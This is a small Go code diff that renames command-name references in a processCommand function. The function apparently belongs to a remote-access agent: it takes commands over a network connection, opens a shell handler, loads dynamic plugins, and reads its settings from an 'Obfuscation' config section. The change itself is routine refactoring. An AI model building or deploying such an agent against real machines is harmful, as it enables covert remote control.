@@ -64,11 +64,11 @@ func processCommand(conn net.Conn, command string) error {
 
 	// Handle built-in and dynamic commands
 	switch cmdName {
-	case config.Obfuscation.Generic.Commands.Shell:
+	case config.Obfuscation.Generic.Commands.Shell.Name:
 		logger.Log("Received shell command, executing shell handler.")
 		commands.ShellHandler(conn)
 		return nil
-	case config.Obfuscation.Generic.Commands.Module:
+	case config.Obfuscation.Generic.Commands.Module.Name:
 		logger.Log("Received module command, loading dynamic plugin.")
 		var moduleData struct {
 			Name string `json:"name"`
